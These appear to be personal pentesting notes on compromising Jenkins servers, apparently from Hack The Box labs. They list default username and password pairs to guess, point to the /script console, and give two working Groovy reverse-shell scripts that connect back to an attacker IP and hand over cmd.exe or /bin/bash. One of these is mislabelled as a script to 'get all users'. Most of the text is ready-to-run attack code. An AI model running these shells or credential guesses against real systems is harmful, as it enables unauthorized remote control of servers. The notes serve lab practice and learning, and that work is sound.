## Jenkins

links:
https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security
https://github.com/gquere/pwn_jenkins

try with password combinations: 
```
admin:password
admin:admin
root:root
root:password
admin:admin1
admin:password1
root:password1
```
## Scripting console
/script
```
http://10.129.142.225:8080/script
```
## Grrovy script to get all users:

```
String host="10.10.15.71";
int port=8000;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();


Explain:
`String host="{your_IP}";` : Specify the Host IP address for the target to connect to
back to.
`int port=8000;` : Specify the port on which the attacker will listen
on.
`String cmd="/bin/bash";` : Specify the shell type the attacker expects. *
* Since the target is Linux-based, we are using `/bin/bash`.
If the target was using Windows, it would have been `cmd.exe`.

```
Other option from hackTheBox:
```
String host="10.10.15.71";
int port=8001;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())
{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());
while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try
{p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

```